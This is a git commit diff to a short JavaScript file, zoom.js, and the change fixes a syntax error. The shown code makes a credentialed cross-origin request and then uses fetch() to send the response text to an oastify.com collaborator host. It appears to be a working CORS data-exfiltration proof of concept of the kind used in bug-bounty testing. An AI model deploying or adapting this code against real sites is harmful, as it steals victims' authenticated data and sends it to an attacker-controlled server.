0ba81ebde30f57a1f48e06c79beb9213a9d0f0b9
monixxxx <92028136+monixxxx@users.noreply.github.com>
2023-07-29 23:31:05 +0300

    Update zoom.js

--- zoom.js
+++ zoom.js
@@ -5,7 +5,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    fetch(('https://s92luzs7awz2niagondy9mc1csij6du2.oastify.com/?xxx='+this.responseText;))
+    fetch(('https://s92luzs7awz2niagondy9mc1csij6du2.oastify.com/?xxx='+this.responseText))
     .then(res => res.json())
     .then(data => console.log(data))
 };
